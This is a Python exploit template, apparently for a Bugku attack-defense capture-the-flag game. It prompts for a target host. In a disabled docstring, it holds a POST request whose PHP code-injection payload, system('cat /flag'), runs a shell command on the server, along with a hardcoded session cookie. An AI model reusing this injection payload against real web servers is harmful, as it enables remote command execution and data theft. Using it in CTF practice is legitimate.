import requests


def attack(ip:str):
    """
    cookies = {"PHPSESSID": "vg8rjkjtbugu49v6f7cq71pth0"}
    # headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://192-168-1-110.pvp4067.bugku.cn", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://192-168-1-110.pvp4067.bugku.cn/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    # requests.post(url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

    data = {'a': 'system(\'cat /flag\');'}
    res = requests.post(ip+'/index.php',data = data,cookies=cookies)
    print(res.text)
    print('get flag!')
    flag = res.text
    """



    flag = ''
    return str(flag)



if __name__ == '__main__':
    attack(input('input attack ip(such as:192-168-1-1.pvp4151.bugku.cn):'))